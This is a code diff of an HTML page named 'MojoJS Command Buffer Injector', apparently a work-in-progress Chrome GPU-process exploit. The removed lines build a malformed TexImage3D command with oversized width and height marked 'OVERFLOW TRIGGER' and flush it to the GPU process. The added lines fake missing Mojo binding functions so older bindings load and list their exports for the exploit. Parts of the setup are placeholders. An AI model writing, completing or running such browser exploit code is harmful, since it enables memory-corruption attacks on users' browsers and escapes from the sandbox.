@@ -2,47 +2,36 @@
 <html>
 <body>
     <h1>MojoJS Command Buffer Injector</h1>
-    <script type="module">
-        // Import the pre-compiled bindings you downloaded
-        import * as gpuChannelModule from './gpu_channel.mojom.js';
-        console.log("LOGGING GPU CHANNEL MODULE:", gpuChannelModule);
+
+    <!-- 1. POLYFILL SCRIPT: Fix the Chrome v149 version mismatch -->
+    <script>
+        // Force the Mojo internal object to exist if it doesn't
+        window.mojo = window.mojo || {};
+        mojo.internal = mojo.internal || {};
         
-        async function runExploit() {
-            if (typeof Mojo === "undefined") {
-                console.error("MojoJS not enabled!");
-                return;
-            }
-
-            console.log("[*] Establishing Mojo GPU Channel...");
-            // The exact setup code depends on the repo you downloaded, but it usually looks like this:
-            let gpu_channel = await setup_gpu_channel(); 
-            let cmd_buffer = await gpu_channel.createCommandBuffer();
-            let shared_mem = cmd_buffer.getSharedMemory();
-
-            console.log("[*] Crafting Malicious TexImage3D Command...");
-            
-            // This is the 44-byte structure for TexImage3D
-            const CMD_ID_TEXIMAGE3D = 0x00EB; // We may need to brute-force this ID
-            const SIZE_IN_WORDS = 11;
-            
-            let payload = new Uint32Array(shared_mem.buffer);
-            payload[0] = (SIZE_IN_WORDS << 11) | CMD_ID_TEXIMAGE3D; 
-            payload[1] = 0x806F;     // GL_TEXTURE_3D
-            payload[2] = 0;          // level
-            payload[3] = 0x8058;     // GL_RGBA8
-            payload[4] = 0x00010000; // width: 65536 (OVERFLOW TRIGGER)
-            payload[5] = 0x00010000; // height: 65536 (OVERFLOW TRIGGER)
-            payload[6] = 1;          // depth
-            payload[7] = 0x1908;     // format: GL_RGBA
-            payload[8] = 0x1401;     // type: GL_UNSIGNED_BYTE
-            payload[9] = 0;          // shm_id 
-            payload[10] = 100;       // shm_offset 
-
-            console.log("[*] Flushing Command Buffer to GPU Process...");
-            cmd_buffer.flush(SIZE_IN_WORDS);
+        // Fake the Enum function that the older mojom.js file is looking for
+        if (!mojo.internal.Enum) {
+            console.log("[*] Polyfilling mojo.internal.Enum for older bindings...");
+            mojo.internal.Enum = function() { return {}; };
         }
         
-        runExploit();
+        // Sometimes it also complains about Struct, so let's safeguard that too
+        if (!mojo.internal.Struct) {
+            mojo.internal.Struct = function() { return {}; };
+        }
+    </script>
+
+    <!-- 2. EXPLOIT SCRIPT -->
+    <script type="module">
+        // Now when this file loads, it will use our faked Enum function instead of crashing!
+        import * as gpuChannelModule from './gpu_channel.mojom.js';
+        
+        console.log("[*] Successfully imported GPU Channel Module:", gpuChannelModule);
+
+        // Print exactly what the module exported so we can find the right proxy name
+        for (let key in gpuChannelModule) {
+            console.log("Exported: " + key);
+        }
     </script>
 </body>
 </html>
